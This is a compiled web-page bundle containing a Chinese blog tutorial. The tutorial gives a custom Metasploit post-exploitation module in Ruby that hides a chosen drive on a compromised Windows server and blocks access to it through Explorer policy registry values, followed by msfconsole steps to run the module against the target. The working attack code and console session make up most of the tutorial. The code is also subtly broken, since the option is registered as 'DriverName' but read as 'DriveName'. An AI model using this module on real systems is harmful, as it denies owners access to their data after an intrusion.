import{i as e,r as t,s as n,t as r}from"./app-BmimykQ0.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-04-17-042-Metasploit%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A9%E7%A3%81%E7%9B%98%E5%A4%B1%E6%95%88%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97.html","title":"Metasploit自定义让磁盘失效的后渗透模块","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit自定义让磁盘失效的后渗透模块","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit自定义让磁盘失效的后渗透模块","lock":"need"},"git":{"updatedTime":1777457818000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"1edeb523e6a5905ee9c691efa90ed644873d52a3","time":1777457818000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-04-17-042-Metasploit自定义让磁盘失效的后渗透模块.md"}`),a={name:`2022-04-17-042-Metasploit自定义让磁盘失效的后渗透模块.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit自定义让磁盘失效的后渗透模块" tabindex="-1"><a class="header-anchor" href="#metasploit自定义让磁盘失效的后渗透模块"><span>Metasploit自定义让磁盘失效的后渗透模块</span></a></h1><p>一个可以禁用Windows 操作系统上的指定硬盘的程序，这里我们将脚本命名为：disable_drives_by_binghe.rb。</p><p>具体内容如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">##</span>
<span class="line"># Author 冰河</span>
<span class="line"># Date 2019-01-12</span>
<span class="line"># Description 禁用Windows操作系统上的指定硬盘的程序</span>
<span class="line">##</span>
<span class="line"></span>
<span class="line">require &#39;msf/core&#39;</span>
<span class="line">require &#39;rex&#39;</span>
<span class="line">require &#39;msf/core/post/windows/registry&#39;</span>
<span class="line"></span>
<span class="line">class Metasploit3 &lt; Msf::Post</span>
<span class="line">  include Msf::Post::Windows::Registry</span>
<span class="line">  </span>
<span class="line">  def initialize</span>
<span class="line">    super(</span>
<span class="line">        &#39;Name&#39;        =&gt; &#39;Driver Disabler&#39;,</span>
<span class="line">        &#39;Description&#39; =&gt; &#39;This Modules Hides and Restrict Access to a Drive&#39;,</span>
<span class="line">        &#39;Author&#39;      =&gt; &#39;binghe&#39;,</span>
<span class="line">        &#39;License&#39;     =&gt; MSF_LICENSE</span>
<span class="line">    )</span>
<span class="line">    register_options(</span>
<span class="line">    [</span>
<span class="line">      OptString.new(&#39;DriverName&#39;, [true, &#39;Please SET the Drive Letter&#39;])</span>
<span class="line">    ], self.class)</span>
<span class="line">    end</span>
<span class="line">   </span>
<span class="line">   def run</span>
<span class="line">    drive_int = drive_string(datastore[&#39;DriveName&#39;])</span>
<span class="line">    key1 = &quot;HKLM\\\\SoftWare\\\\Microsoft\\\\WIndows\\\\CurrentVersion\\\\Policies\\\\Explorer&quot;</span>
<span class="line">    exists = meterpreter_registry_key_exist?(key1)</span>
<span class="line">    if not exists</span>
<span class="line">      print_good(&quot;Hidden Drive&quot;) </span>
<span class="line">      meterpreter_registry_setvaldata(key1, &#39;NoDrives&#39;, drive_int.to_s, &#39;REG_DWORD&#39;, REGISTRY_VIEW_NATIVE)</span>
<span class="line">      print_good(&quot;Restricting Access to the Drive&quot;)</span>
<span class="line">      meterpreter_registry_setvaldata(key1, &#39;NoViewOnDrives&#39;, drive_int.to_s, &#39;REG_DWORD&#39;,REGISTRY_VIEW_NATIVE)</span>
<span class="line">    else</span>
<span class="line">      print_good(&quot;Key Exist, Skipping and Creating Values&quot;)</span>
<span class="line">      print_good(&quot;Hiding Drive&quot;)</span>
<span class="line">      meterpreter_registry_setvaldata(key1, &#39;NoDrives&#39;, drive_int.to_s, &#39;REG_DWORD&#39;, REGISTRY_VIEW_NATIVE)</span>
<span class="line">      print_good(&quot;Restricting Access to the Drive&quot;)</span>
<span class="line">      meterpreter_registry_setvaldata(key1, &#39;NoViewOnDrives&#39;, drive_int.to_s, &#39;REG_DWORD&#39;,REGISTRY_VIEW_NATIVE)</span>
<span class="line">     end</span>
<span class="line">     print_good(&quot;Disabled #{datastore[&#39;DriveName&#39;]} Drive&quot;) </span>
<span class="line">    end</span>
<span class="line">    </span>
<span class="line">   def drive_string(drive)</span>
<span class="line">    case drive</span>
<span class="line">      when &#39;A&#39;</span>
<span class="line">        return 1</span>
<span class="line">      when &#39;B&#39;</span>
<span class="line">        return 2</span>
<span class="line">      when &#39;C&#39;</span>
<span class="line">        return 4</span>
<span class="line">      when &#39;D&#39;</span>
<span class="line">        return 8</span>
<span class="line">      when &#39;E&#39;</span>
<span class="line">        return 16</span>
<span class="line">       end</span>
<span class="line">    end </span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>注意：使用此脚本的前提是我们已经经过一系列的渗透拿到了目标Windows服务器的System权限。</strong></p><p>接下来我们将脚本传到Kali的/usr/share/metasploit-framework/modules/post/windows/manage目录下，此时，我们在Kali下操作：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">msf auxiliary(scanner/ssh/ssh_brute_by_binghe) &gt; use post/windows/manage/disable_drives_by_binghe </span>
<span class="line">msf post(windows/manage/disable_drives_by_binghe) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (post/windows/manage/disable_drives_by_binghe):</span>
<span class="line"></span>
<span class="line">   Name        Current Setting  Required  Description</span>
<span class="line">   ----        ---------------  --------  -----------</span>
<span class="line">   DriverName                   yes       Please SET the Drive Letter</span>
<span class="line">   SESSION                      yes       The session to run this module on.</span>
<span class="line"></span>
<span class="line">msf post(windows/manage/disable_drives_by_binghe) &gt; set DriverName D</span>
<span class="line">DriverName =&gt; D</span>
<span class="line">msf post(windows/manage/disable_drives_by_binghe) &gt; run</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时，查看目标服务器的D盘确实被成功禁用了。</p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,11)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};